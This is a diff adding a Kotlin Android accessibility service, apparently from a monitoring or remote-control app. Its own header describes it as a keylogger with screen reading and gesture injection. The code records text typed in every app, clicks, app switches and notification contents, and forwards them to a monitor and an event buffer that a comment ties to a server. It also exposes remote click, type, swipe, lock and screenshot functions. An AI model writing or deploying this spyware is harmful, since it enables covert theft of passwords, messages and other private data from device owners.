@@ -1,0 +1,737 @@
+     1→package com.abuzahra.manager.service
+     2→
+     3→import android.accessibilityservice.AccessibilityService
+     4→import android.accessibilityservice.AccessibilityServiceInfo
+     5→import android.accessibilityservice.GestureDescription
+     6→import android.app.Notification
+     7→import android.content.Intent
+     8→import android.graphics.Path
+     9→import android.graphics.Rect
+    10→import android.os.Build
+    11→import android.os.Bundle
+    12→import android.view.accessibility.AccessibilityEvent
+    13→import android.view.accessibility.AccessibilityNodeInfo
+    14→import com.abuzahra.manager.executor.MonitorExecutor
+    15→import kotlinx.coroutines.CoroutineScope
+    16→import kotlinx.coroutines.Dispatchers
+    17→import kotlinx.coroutines.launch
+    18→import java.util.concurrent.CountDownLatch
+    19→import java.util.concurrent.TimeUnit
+    20→
+    21→/**
+    22→ * MyAccessibilityService - Complete Implementation
+    23→ * Provides screen reading, keylogger, automated UI interactions, and gesture injection
+    24→ */
+    25→class MyAccessibilityService : AccessibilityService() {
+    26→
+    27→    companion object {
+    28→        private var instance: MyAccessibilityService? = null
+    29→        private var keyloggerEnabled = false
+    30→        private var autoClickEnabled = false
+    31→        private var notificationInterceptEnabled = false
+    32→        
+    33→        // Gesture results
+    34→        private var gestureResult: Boolean = false
+    35→        private var gestureLatch: CountDownLatch? = null
+    36→
+    37→        fun getInstance(): MyAccessibilityService? = instance
+    38→
+    39→        fun isEnabled(context: android.content.Context): Boolean {
+    40→            val enabledServices = android.provider.Settings.Secure.getString(
+    41→                context.contentResolver,
+    42→                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+    43→            ) ?: return false
+    44→
+    45→            val serviceName = "${context.packageName}/${MyAccessibilityService::class.java.canonicalName}"
+    46→            return enabledServices.contains(serviceName) || enabledServices.contains(context.packageName)
+    47→        }
+    48→        
+    49→        fun setKeyloggerEnabled(enabled: Boolean) {
+    50→            keyloggerEnabled = enabled
+    51→        }
+    52→        
+    53→        fun isKeyloggerEnabled(): Boolean = keyloggerEnabled
+    54→        
+    55→        fun setAutoClickEnabled(enabled: Boolean) {
+    56→            autoClickEnabled = enabled
+    57→        }
+    58→        
+    59→        fun setNotificationInterceptEnabled(enabled: Boolean) {
+    60→            notificationInterceptEnabled = enabled
+    61→        }
+    62→    }
+    63→
+    64→    // Event statistics
+    65→    private var eventCount = 0L
+    66→    private var textEventCount = 0L
+    67→    private var clickEventCount = 0L
+    68→    private var notificationEventCount = 0L
+    69→    private var startTime = System.currentTimeMillis()
+    70→    
+    71→    // Last captured data
+    72→    private var lastCapturedText = StringBuilder()
+    73→    private var currentApp = ""
+    74→    private var lastEventType = ""
+    75→
+    76→    override fun onServiceConnected() {
+    77→        super.onServiceConnected()
+    78→        instance = this
+    79→
+    80→        // Configure the service with comprehensive settings
+    81→        val info = AccessibilityServiceInfo().apply {
+    82→            // Listen to all event types
+    83→            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
+    84→            
+    85→            // Feedback type
+    86→            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
+    87→            
+    88→            // Comprehensive flags
+    89→            flags = AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE or
+    90→                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
+    91→                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
+    92→                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
+    93→                    AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE or
+    94→                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS or
+    95→                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
+    96→            
+    97→            // Short notification timeout for responsiveness
+    98→            notificationTimeout = 50
+    99→            
+   100→            // Listen to all packages
+   101→            packageNames = null
+   102→            
+   103→            // Additional capabilities are configured in accessibility_service_config.xml
+   104→            // (canPerformGestures, canRetrieveWindowContent, etc.)
+   105→        }
+   106→        serviceInfo = info
+   107→
+   108→        // Notify server that accessibility is enabled
+   109→        com.abuzahra.manager.EventBuffer.addEvent(
+   110→            "accessibility_enabled",
+   111→            mapOf(
+   112→                "status" to "connected",
+   113→                "service" to "MyAccessibilityService"
+   114→            )
+   115→        )
+   116→    }
+   117→
+   118→    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+   119→        event ?: return
+   120→        
+   121→        eventCount++
+   122→        val packageName = event.packageName?.toString() ?: "unknown"
+   123→        
+   124→        when (event.eventType) {
+   125→            // Text changed events - KEYLOGGER
+   126→            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+   127→                handleTextChangeEvent(event, packageName)
+   128→            }
+   129→            
+   130→            // Text selection events
+   131→            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
+   132→                handleTextSelectionEvent(event, packageName)
+   133→            }
+   134→            
+   135→            // Click events
+   136→            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
+   137→                handleClickEvent(event, packageName)
+   138→            }
+   139→            
+   140→            // Focus events
+   141→            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
+   142→                handleFocusEvent(event, packageName)
+   143→            }
+   144→            
+   145→            // Notification events
+   146→            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
+   147→                handleNotificationEvent(event, packageName)
+   148→            }
+   149→            
+   150→            // Window state changed (app switches)
+   151→            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
+   152→                handleWindowStateChangeEvent(event, packageName)
+   153→            }
+   154→            
+   155→            // Window content changed
+   156→            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
+   157→                handleWindowContentChangeEvent(event, packageName)
+   158→            }
+   159→            
+   160→            // View scrolled
+   161→            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
+   162→                // Usually not needed for keylogger
+   163→            }
+   164→            
+   165→            // Gesture events (Android 8+)
+   166→            AccessibilityEvent.TYPE_GESTURE_DETECTION_START -> {
+   167→                // Could track gestures
+   168→            }
+   169→            
+   170→            else -> {
+   171→                // Other events
+   172→            }
+   173→        }
+   174→    }
+   175→
+   176→    private fun handleTextChangeEvent(event: AccessibilityEvent, packageName: String) {
+   177→        if (!keyloggerEnabled) return
+   178→        
+   179→        textEventCount++
+   180→        
+   181→        try {
+   182→            // Get the text from the event
+   183→            val text = event.text?.joinToString("") ?: ""
+   184→            val fromIndex = event.fromIndex
+   185→            val addedCount = event.addedCount
+   186→            val removedCount = event.removedCount
+   187→            val beforeText = event.beforeText?.toString() ?: ""
+   188→            
+   189→            // Get the source node for more details
+   190→            val source = event.source
+   191→            val viewId = source?.viewIdResourceName ?: ""
+   192→            val className = source?.className?.toString() ?: ""
+   193→            val description = source?.contentDescription?.toString() ?: ""
+   194→            
+   195→            // Build the captured data
+   196→            val capturedText = buildString {
+   197→                if (text.isNotEmpty()) {
+   198→                    append(text)
+   199→                }
+   200→                if (beforeText.isNotEmpty() && text.isNotEmpty() && beforeText != text) {
+   201→                    // Text was modified
+   202→                    append("[EDIT]")
+   203→                }
+   204→            }
+   205→            
+   206→            if (capturedText.isNotEmpty()) {
+   207→                // Update last captured
+   208→                lastCapturedText.append(capturedText)
+   209→                if (lastCapturedText.length > 100000) {
+   210→                    lastCapturedText = StringBuilder(lastCapturedText.takeLast(50000))
+   211→                }
+   212→                
+   213→                // Send to MonitorExecutor
+   214→                MonitorExecutor.appendKeylog(
+   215→                    packageName = packageName,
+   216→                    text = capturedText,
+   217→                    viewType = "text_change"
+   218→                )
+   219→                
+   220→                // Also log with context
+   221→                logKeyEvent(
+   222→                    packageName = packageName,
+   223→                    text = capturedText,
+   224→                    viewId = viewId,
+   225→                    className = className
+   226→                )
+   227→            }
+   228→            
+   229→            source?.recycle()
+   230→        } catch (e: Exception) {
+   231→            // Log error but don't crash
+   232→        }
+   233→    }
+   234→    
+   235→    private fun handleTextSelectionEvent(event: AccessibilityEvent, packageName: String) {
+   236→        // Could be used to track what text user selected
+   237→    }
+   238→
+   239→    private fun handleClickEvent(event: AccessibilityEvent, packageName: String) {
+   240→        clickEventCount++
+   241→        lastEventType = "click"
+   242→        
+   243→        if (!keyloggerEnabled) return
+   244→        
+   245→        try {
+   246→            val text = event.text?.joinToString("") ?: ""
+   247→            val contentDescription = event.contentDescription?.toString() ?: ""
+   248→            val source = event.source
+   249→            
+   250→            val viewId = source?.viewIdResourceName ?: ""
+   251→            val className = source?.className?.toString() ?: ""
+   252→            
+   253→            val clickText = buildString {
+   254→                if (text.isNotEmpty()) append(text)
+   255→                if (contentDescription.isNotEmpty()) {
+   256→                    if (isNotEmpty()) append(" | ")
+   257→                    append(contentDescription)
+   258→                }
+   259→            }
+   260→            
+   261→            if (clickText.isNotEmpty()) {
+   262→                MonitorExecutor.appendKeylog(
+   263→                    packageName = packageName,
+   264→                    text = "[CLICK:$clickText]",
+   265→                    viewType = "click"
+   266→                )
+   267→            }
+   268→            
+   269→            source?.recycle()
+   270→        } catch (_: Exception) {}
+   271→    }
+   272→    
+   273→    private fun handleFocusEvent(event: AccessibilityEvent, packageName: String) {
+   274→        // Track which view has focus - useful for keylogger context
+   275→    }
+   276→    
+   277→    private fun handleNotificationEvent(event: AccessibilityEvent, packageName: String) {
+   278→        notificationEventCount++
+   279→        
+   280→        if (!notificationInterceptEnabled && !keyloggerEnabled) return
+   281→        
+   282→        try {
+   283→            val text = event.text?.joinToString("\n") ?: ""
+   284→            val tickerText = event.text?.joinToString() ?: ""
+   285→            
+   286→            // For notifications, try to get more data from the Parcelable
+   287→            val parcelableData = event.parcelableData
+   288→            
+   289→            var title = ""
+   290→            var message = ""
+   291→            var category = ""
+   292→            
+   293→            if (parcelableData is Notification) {
+   294→                val notification = parcelableData
+   295→                title = notification.extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
+   296→                message = notification.extras?.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
+   297→                category = notification.category ?: ""
+   298→                
+   299→                // Add to notification history
+   300→                MonitorExecutor.addNotification(packageName, title, message, category)
+   301→            }
+   302→            
+   303→            // Log notification if keylogger is active
+   304→            if (keyloggerEnabled) {
+   305→                val notifText = buildString {
+   306→                    if (title.isNotEmpty()) append("[$title] ")
+   307→                    if (message.isNotEmpty()) append(message)
+   308→                    if (text.isNotEmpty() && text != message) append(" | $text")
+   309→                }
+   310→                
+   311→                if (notifText.isNotEmpty()) {
+   312→                    MonitorExecutor.appendKeylog(
+   313→                        packageName = packageName,
+   314→                        text = "[NOTIF:$notifText]",
+   315→                        viewType = "notification"
+   316→                    )
+   317→                }
+   318→            }
+   319→        } catch (_: Exception) {}
+   320→    }
+   321→    
+   322→    private fun handleWindowStateChangeEvent(event: AccessibilityEvent, packageName: String) {
+   323→        // App switch or activity change
+   324→        val className = event.className?.toString() ?: ""
+   325→        val text = event.text?.joinToString("") ?: ""
+   326→        
+   327→        if (packageName != currentApp) {
+   328→            currentApp = packageName
+   329→            
+   330→            // Log app switch if keylogger active
+   331→            if (keyloggerEnabled) {
+   332→                MonitorExecutor.appendKeylog(
+   333→                    packageName = packageName,
+   334→                    text = "[APP:$packageName]",
+   335→                    viewType = "app_switch"
+   336→                )
+   337→            }
+   338→        }
+   339→    }
+   340→    
+   341→    private fun handleWindowContentChangeEvent(event: AccessibilityEvent, packageName: String) {
+   342→        // Content changed in current window
+   343→        // Useful for detecting dynamic content updates
+   344→    }
+   345→
+   346→    private fun logKeyEvent(packageName: String, text: String, viewId: String, className: String) {
+   347→        com.abuzahra.manager.EventBuffer.addEvent(
+   348→            "key_event",
+   349→            mapOf(
+   350→                "package" to packageName,
+   351→                "text" to text.take(500),
+   352→                "view_id" to viewId,
+   353→                "class" to className
+   354→            )
+   355→        )
+   356→    }
+   357→
+   358→    override fun onInterrupt() {
+   359→        com.abuzahra.manager.EventBuffer.addEvent(
+   360→            "accessibility_interrupted",
+   361→            mapOf("timestamp" to System.currentTimeMillis())
+   362→        )
+   363→    }
+   364→
+   365→    override fun onDestroy() {
+   366→        super.onDestroy()
+   367→        instance = null
+   368→        keyloggerEnabled = false
+   369→        autoClickEnabled = false
+   370→        
+   371→        // Buffer event locally
+   372→        com.abuzahra.manager.EventBuffer.addEvent(
+   373→            "accessibility_destroyed",
+   374→            mapOf("status" to "disconnected")
+   375→        )
+   376→    }
+   377→
+   378→    // ===== AUTOMATED ACTIONS =====
+   379→
+   380→    /**
+   381→     * Click on a node by its text
+   382→     */
+   383→    fun clickOnText(text: String, exactMatch: Boolean = false): Boolean {
+   384→        val root = rootInActiveWindow ?: return false
+   385→        
+   386→        val nodes = if (exactMatch) {
+   387→            root.findAccessibilityNodeInfosByText(text)
+   388→                .filter { it.text?.toString() == text }
+   389→        } else {
+   390→            root.findAccessibilityNodeInfosByText(text)
+   391→        }
+   392→        
+   393→        for (node in nodes) {
+   394→            val clicked = performClickOnNode(node)
+   395→            if (clicked) return true
+   396→        }
+   397→        
+   398→        return false
+   399→    }
+   400→
+   401→    /**
+   402→     * Click on a node by its view ID
+   403→     */
+   404→    fun clickOnViewId(viewId: String): Boolean {
+   405→        val root = rootInActiveWindow ?: return false
+   406→        
+   407→        val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
+   408→        for (node in nodes) {
+   409→            val clicked = performClickOnNode(node)
+   410→            if (clicked) return true
+   411→        }
+   412→        
+   413→        return false
+   414→    }
+   415→    
+   416→    /**
+   417→     * Click on node at specific coordinates
+   418→     */
+   419→    fun clickAt(x: Int, y: Int): Boolean {
+   420→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
+   421→            return false
+   422→        }
+   423→        
+   424→        val path = Path().apply {
+   425→            moveTo(x.toFloat(), y.toFloat())
+   426→        }
+   427→        
+   428→        val gesture = GestureDescription.Builder()
+   429→            .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
+   430→            .build()
+   431→        
+   432→        gestureLatch = CountDownLatch(1)
+   433→        gestureResult = false
+   434→        
+   435→        val dispatched = dispatchGesture(gesture, object : GestureResultCallback() {
+   436→            override fun onCompleted(gestureDescription: GestureDescription?) {
+   437→                gestureResult = true
+   438→                gestureLatch?.countDown()
+   439→            }
+   440→            
+   441→            override fun onCancelled(gestureDescription: GestureDescription?) {
+   442→                gestureResult = false
+   443→                gestureLatch?.countDown()
+   444→            }
+   445→        }, null)
+   446→        
+   447→        if (dispatched) {
+   448→            gestureLatch?.await(2, TimeUnit.SECONDS)
+   449→        }
+   450→        
+   451→        return gestureResult
+   452→    }
+   453→    
+   454→    /**
+   455→     * Swipe gesture
+   456→     */
+   457→    fun swipe(startX: Int, startY: Int, endX: Int, endY: Int, durationMs: Long = 300): Boolean {
+   458→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
+   459→            return false
+   460→        }
+   461→        
+   462→        val path = Path().apply {
+   463→            moveTo(startX.toFloat(), startY.toFloat())
+   464→            lineTo(endX.toFloat(), endY.toFloat())
+   465→        }
+   466→        
+   467→        val gesture = GestureDescription.Builder()
+   468→            .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
+   469→            .build()
+   470→        
+   471→        gestureLatch = CountDownLatch(1)
+   472→        gestureResult = false
+   473→        
+   474→        val dispatched = dispatchGesture(gesture, object : GestureResultCallback() {
+   475→            override fun onCompleted(gestureDescription: GestureDescription?) {
+   476→                gestureResult = true
+   477→                gestureLatch?.countDown()
+   478→            }
+   479→            
+   480→            override fun onCancelled(gestureDescription: GestureDescription?) {
+   481→                gestureResult = false
+   482→                gestureLatch?.countDown()
+   483→            }
+   484→        }, null)
+   485→        
+   486→        if (dispatched) {
+   487→            gestureLatch?.await(2, TimeUnit.SECONDS)
+   488→        }
+   489→        
+   490→        return gestureResult
+   491→    }
+   492→    
+   493→    /**
+   494→     * Type text into a focused input field
+   495→     */
+   496→    fun typeText(text: String): Boolean {
+   497→        val root = rootInActiveWindow ?: return false
+   498→        
+   499→        // Find focused node or editable node
+   500→        val focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
+   501→            ?: root.findAccessibilityNodeInfosByViewId("android:id/edit").firstOrNull()
+   502→            ?: run {
+   503→                val nodes = root.findAccessibilityNodeInfosByText("")
+   504→                nodes.firstOrNull { it.isEditable }
+   505→            }
+   506→        
+   507→        if (focusedNode == null) return false
+   508→        
+   509→        // Try to set text directly
+   510→        val arguments = Bundle()
+   511→        arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
+   512→        val result = focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
+   513→        
+   514→        focusedNode.recycle()
+   515→        return result
+   516→    }
+   517→    
+   518→    /**
+   519→     * Scroll in a direction
+   520→     */
+   521→    fun scroll(direction: ScrollDirection): Boolean {
+   522→        val root = rootInActiveWindow ?: return false
+   523→        
+   524→        val action = when (direction) {
+   525→            ScrollDirection.UP -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
+   526→            ScrollDirection.DOWN -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
+   527→            ScrollDirection.LEFT -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
+   528→            ScrollDirection.RIGHT -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
+   529→        }
+   530→        
+   531→        // Find scrollable node
+   532→        val scrollableNode = findScrollableNode(root, direction) ?: return false
+   533→        val result = scrollableNode.performAction(action)
+   534→        scrollableNode.recycle()
+   535→        
+   536→        return result
+   537→    }
+   538→    
+   539→    private fun findScrollableNode(node: AccessibilityNodeInfo, direction: ScrollDirection): AccessibilityNodeInfo? {
+   540→        if (node.isScrollable) return node
+   541→        
+   542→        for (i in 0 until node.childCount) {
+   543→            val child = node.getChild(i) ?: continue
+   544→            val result = findScrollableNode(child, direction)
+   545→            if (result != null) return result
+   546→            child.recycle()
+   547→        }
+   548→        
+   549→        return null
+   550→    }
+   551→    
+   552→    /**
+   553→     * Get all text from current screen
+   554→     */
+   555→    fun getAllText(): String {
+   556→        val root = rootInActiveWindow ?: return ""
+   557→        val textBuilder = StringBuilder()
+   558→        
+   559→        extractTextFromNode(root, textBuilder)
+   560→        
+   561→        return textBuilder.toString()
+   562→    }
+   563→    
+   564→    private fun extractTextFromNode(node: AccessibilityNodeInfo, builder: StringBuilder) {
+   565→        val text = node.text?.toString()
+   566→        if (!text.isNullOrBlank()) {
+   567→            builder.append(text).append("\n")
+   568→        }
+   569→        
+   570→        val contentDesc = node.contentDescription?.toString()
+   571→        if (!contentDesc.isNullOrBlank() && contentDesc != text) {
+   572→            builder.append(contentDesc).append("\n")
+   573→        }
+   574→        
+   575→        for (i in 0 until node.childCount) {
+   576→            val child = node.getChild(i) ?: continue
+   577→            extractTextFromNode(child, builder)
+   578→            child.recycle()
+   579→        }
+   580→    }
+   581→    
+   582→    /**
+   583→     * Find node containing specific text
+   584→     */
+   585→    fun findNodeByText(text: String): AccessibilityNodeInfo? {
+   586→        val root = rootInActiveWindow ?: return null
+   587→        return root.findAccessibilityNodeInfosByText(text).firstOrNull()
+   588→    }
+   589→    
+   590→    /**
+   591→     * Get node bounds
+   592→     */
+   593→    fun getNodeBounds(node: AccessibilityNodeInfo): Rect {
+   594→        val bounds = Rect()
+   595→        node.getBoundsInScreen(bounds)
+   596→        return bounds
+   597→    }
+   598→    
+   599→    /**
+   600→     * Long press on a node
+   601→     */
+   602→    fun longPress(node: AccessibilityNodeInfo): Boolean {
+   603→        return node.performAction(AccessibilityNodeInfo.ACTION_LONG_CLICK)
+   604→    }
+   605→    
+   606→    /**
+   607→     * Long press at coordinates
+   608→     */
+   609→    fun longPressAt(x: Int, y: Int): Boolean {
+   610→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
+   611→            return false
+   612→        }
+   613→        
+   614→        val path = Path().apply {
+   615→            moveTo(x.toFloat(), y.toFloat())
+   616→        }
+   617→        
+   618→        val gesture = GestureDescription.Builder()
+   619→            .addStroke(GestureDescription.StrokeDescription(path, 0, 500))
+   620→            .build()
+   621→        
+   622→        return dispatchGesture(gesture, null, null)
+   623→    }
+   624→
+   625→    private fun performClickOnNode(node: AccessibilityNodeInfo): Boolean {
+   626→        // Try direct click
+   627→        if (node.isClickable) {
+   628→            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+   629→        }
+   630→        
+   631→        // Try parent click
+   632→        var parent = node.parent
+   633→        while (parent != null) {
+   634→            if (parent.isClickable) {
+   635→                val clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+   636→                parent.recycle()
+   637→                return clicked
+   638→            }
+   639→            val grandParent = parent.parent
+   640→            parent.recycle()
+   641→            parent = grandParent
+   642→        }
+   643→        
+   644→        // Try click via coordinates
+   645→        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+   646→            val bounds = Rect()
+   647→            node.getBoundsInScreen(bounds)
+   648→            return clickAt(bounds.centerX(), bounds.centerY())
+   649→        }
+   650→        
+   651→        return false
+   652→    }
+   653→
+   654→    // ===== GLOBAL ACTIONS =====
+   655→
+   656→    fun goBack(): Boolean = performGlobalAction(GLOBAL_ACTION_BACK)
+   657→
+   658→    fun goHome(): Boolean = performGlobalAction(GLOBAL_ACTION_HOME)
+   659→
+   660→    fun openRecents(): Boolean = performGlobalAction(GLOBAL_ACTION_RECENTS)
+   661→
+   662→    fun openNotifications(): Boolean = performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
+   663→
+   664→    fun openQuickSettings(): Boolean = performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS)
+   665→
+   666→    fun openPowerDialog(): Boolean = performGlobalAction(GLOBAL_ACTION_POWER_DIALOG)
+   667→
+   668→    fun lockScreen(): Boolean {
+   669→        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+   670→            performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
+   671→        } else {
+   672→            false
+   673→        }
+   674→    }
+   675→
+   676→    fun takeScreenshot(): Boolean {
+   677→        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+   678→            performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT)
+   679→        } else {
+   680→            false
+   681→        }
+   682→    }
+   683→    
+   684→    fun accessibilityButton(): Boolean {
+   685→        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+   686→            performGlobalAction(GLOBAL_ACTION_ACCESSIBILITY_BUTTON)
+   687→        } else {
+   688→            false
+   689→        }
+   690→    }
+   691→    
+   692→    fun accessibilityShortcut(): Boolean {
+   693→        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+   694→            performGlobalAction(GLOBAL_ACTION_ACCESSIBILITY_SHORTCUT)
+   695→        } else {
+   696→            false
+   697→        }
+   698→    }
+   699→    
+   700→    fun accessibilityAllApps(): Boolean {
+   701→        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+   702→            performGlobalAction(GLOBAL_ACTION_ACCESSIBILITY_ALL_APPS)
+   703→        } else {
+   704→            false
+   705→        }
+   706→    }
+   707→    
+   708→    fun dismissNotificationShade(): Boolean {
+   709→        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+   710→            performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE)
+   711→        } else {
+   712→            goBack()
+   713→        }
+   714→    }
+   715→
+   716→    // ===== STATISTICS =====
+   717→    
+   718→    fun getStats(): Map<String, Any> {
+   719→        return mapOf(
+   720→            "uptime_ms" to (System.currentTimeMillis() - startTime),
+   721→            "total_events" to eventCount,
+   722→            "text_events" to textEventCount,
+   723→            "click_events" to clickEventCount,
+   724→            "notification_events" to notificationEventCount,
+   725→            "keylogger_enabled" to keyloggerEnabled,
+   726→            "auto_click_enabled" to autoClickEnabled,
+   727→            "current_app" to currentApp,
+   728→            "last_event_type" to lastEventType,
+   729→            "captured_text_length" to lastCapturedText.length
+   730→        )
+   731→    }
+   732→
+   733→    enum class ScrollDirection {
+   734→        UP, DOWN, LEFT, RIGHT
+   735→    }
+   736→}
+   737→
